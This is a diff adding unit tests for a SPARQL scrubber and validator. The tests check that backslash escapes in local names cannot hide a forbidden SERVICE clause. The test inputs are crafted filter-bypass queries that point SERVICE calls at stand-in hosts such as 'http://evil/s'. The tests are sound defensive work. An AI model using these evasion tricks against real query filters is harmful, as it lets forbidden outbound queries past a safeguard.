@@ -34,6 +34,21 @@ describe('scrubSparql()', () => {
     const scrubbed = scrubSparql('FILTER(?d < ?e) SELECT_MARKER')
     expect(scrubbed).toContain('SELECT_MARKER')
   })
+
+  it('SC6 – a PN_LOCAL_ESC backslash-escape cannot open a comment that swallows later text', () => {
+    // `ex:a\#b` is a prefixed local name with a PN_LOCAL_ESC (`\#`). The escaped
+    // "#" must NOT be read as a line comment — otherwise the rest of the line
+    // (a live SERVICE) would be scrubbed away and go undetected (under-block).
+    const scrubbed = scrubSparql('?s ex:a\\#b SERVICE_MARKER <http://evil/s>')
+    expect(scrubbed).toContain('SERVICE_MARKER')
+  })
+
+  it('SC7 – a PN_LOCAL_ESC backslash-escape cannot open a string that swallows later text', () => {
+    // `ex:a\'` — the escaped single quote must not open a string that runs to a
+    // later real quote, swallowing a live SERVICE in between.
+    const scrubbed = scrubSparql("?s ex:a\\' SERVICE_MARKER 'closes here'")
+    expect(scrubbed).toContain('SERVICE_MARKER')
+  })
 })
 
 describe('validateAndPrepareSparql() – accepted forms', () => {
@@ -100,6 +115,54 @@ describe('validateAndPrepareSparql() – forbidden keyword reject matrix', () =>
   it('RJ-under-block-2 – a SERVICE after a closed string literal is still caught', () => {
     const q = 'SELECT ?s WHERE { ?s rdfs:label "done" . SERVICE <http://evil/s> { ?s ?p ?o } }'
     expect(() => validateAndPrepareSparql(q)).toThrow(/SERVICE/)
+  })
+})
+
+describe('validateAndPrepareSparql() – PN_LOCAL_ESC scrubber-bypass guard', () => {
+  // SPARQL's PN_LOCAL_ESC production allows a backslash to escape one of
+  //   _ ~ . - ! $ & ' ( ) * + , ; = / ? # @ %
+  // inside a prefixed local name (e.g. `ex:a\#b`). Left unmodelled, that stray
+  // backslash lets the following char (`#`, `'`, `"`, …) open a comment/string
+  // that swallows a live SERVICE clause — an under-block that ships the forbidden
+  // query to the endpoint. Each case below must be REJECTED (SERVICE detected).
+
+  it('RJ-esc-hash – escaped "#" in a local name must not hide a trailing SERVICE', () => {
+    const q =
+      'PREFIX ex: <http://example.org/> ' +
+      'SELECT ?s WHERE { ?s ex:a\\#b ?o . SERVICE <http://evil.example/sparql> { ?s ?p ?o } }'
+    expect(() => validateAndPrepareSparql(q)).toThrow(/SERVICE/)
+  })
+
+  it('RJ-esc-quote – escaped "\'" closed by a later real string must not hide SERVICE', () => {
+    const q =
+      'PREFIX ex: <http://example.org/> ' +
+      "SELECT ?s WHERE { ?s ex:a\\' SERVICE <http://evil/s> 'x' ?o }"
+    expect(() => validateAndPrepareSparql(q)).toThrow(/SERVICE/)
+  })
+
+  it('RJ-esc-dquote – a backslash before a double-quote outside a string must not hide SERVICE', () => {
+    const q =
+      'PREFIX ex: <http://example.org/> ' +
+      'SELECT ?s WHERE { ?s ex:a\\"done SERVICE <http://evil/s> stuff" ?o }'
+    expect(() => validateAndPrepareSparql(q)).toThrow(/SERVICE/)
+  })
+
+  it('RJ-esc-percent – escaped "%" variant with a SERVICE is still rejected', () => {
+    const q =
+      'PREFIX ex: <http://example.org/> ' +
+      'SELECT ?s WHERE { ?s ex:a\\%b ?o . SERVICE <http://evil/s> { ?s ?p ?o } }'
+    expect(() => validateAndPrepareSparql(q)).toThrow(/SERVICE/)
+  })
+
+  it('RJ-esc-legit – a legit PN_LOCAL_ESC query with NO forbidden keyword is accepted', () => {
+    // Documented behavior: PASS. Scrubbing the `\.` to a space splits the local
+    // name in the DETECTION copy only; the ORIGINAL query is what gets sent, so
+    // execution is unaffected. (Over-block would also be acceptable per the brief,
+    // but here it passes.)
+    const q = 'SELECT ?s WHERE { ?s ex:foo\\.bar ?o }'
+    expect(() => validateAndPrepareSparql(q)).not.toThrow()
+    const { limitAdded } = validateAndPrepareSparql(q)
+    expect(limitAdded).toBe(true)
   })
 })
 
